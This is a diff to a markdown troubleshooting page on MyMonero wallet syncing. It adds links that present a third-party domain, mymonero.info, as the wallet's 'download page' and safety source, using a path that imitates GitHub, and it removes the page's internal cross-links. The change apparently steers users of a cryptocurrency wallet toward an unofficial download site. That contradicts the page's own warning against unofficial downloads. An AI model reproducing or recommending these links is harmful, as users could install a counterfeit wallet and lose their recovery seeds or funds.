@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 If MyMonero is not syncing, first distinguish a connection issue from wallet scanning. The hosted servers and web wallet login stopped; the final desktop release still opens wallets and sends XMR but is no longer maintained.
 
+
+The MyMonero.info site covers this in its [MyMonero not syncing guide](https://mymonero.info/mymonero-not-syncing). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.
+
 ## You'll see this if
 - The desktop wallet remains on a loading or connecting screen.
 - The balance is not changing or appears incomplete after opening the app.
@@ -52,9 +55,9 @@ Restore height is the block height where scanning begins. Starting earlier is sa
 ## If that did not work
 If the app cannot connect even though your device is online, note the app version, operating system, and exact error for your own troubleshooting. Consult the release information and project repository. Avoid downloading unofficial patches or connecting to a server supplied by a stranger. Do not assume a server can be restored by changing wallet credentials.
 
-If scanning completes but the balance is unexpected, verify the wallet identity and restore height. Earlier is safer when uncertain but takes longer. A missing balance is not by itself proof that funds are gone or that the seed is invalid. Do not initiate a sweep or send transaction just to test syncing; sweeping sends all funds to a new wallet and is a separate action. See [transaction not showing](./mymonero-transaction-not-showing.md) and [locked or pending balance](./mymonero-locked-pending-balance.md).
+If scanning completes but the balance is unexpected, verify the wallet identity and restore height. Earlier is safer when uncertain but takes longer. A missing balance is not by itself proof that funds are gone or that the seed is invalid. Do not initiate a sweep or send transaction just to test syncing; sweeping sends all funds to a new wallet and is a separate action. See transaction not showing and locked or pending balance.
 
-If you are relying on the desktop app, remember it is no longer maintained and has no security updates. Do not expose your seed while seeking help. If you decide to restore in Cake Wallet, confirm that your seed is complete, choose the correct 13- or 25-word format, and understand that scanning may take time. See [restore a MyMonero wallet](./restore-mymonero-wallet.md) and safe backup practices.
+If you are relying on the desktop app, remember it is no longer maintained and has no security updates. Do not expose your seed while seeking help. If you decide to restore in Cake Wallet, confirm that your seed is complete, choose the correct 13- or 25-word format, and understand that scanning may take time. See restore a MyMonero wallet and safe backup practices.
 
 ## Prevention
 Keep a secure offline seed backup and note which format it uses. Maintain private records of relevant wallet context, including a known restore height if available. Protect the backup from both loss and unauthorized access. Never put recovery words into a web page or chat to diagnose an internet connection.
@@ -90,6 +93,7 @@ The final desktop release is v1.3.3 and the old app is no longer maintained, wit
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
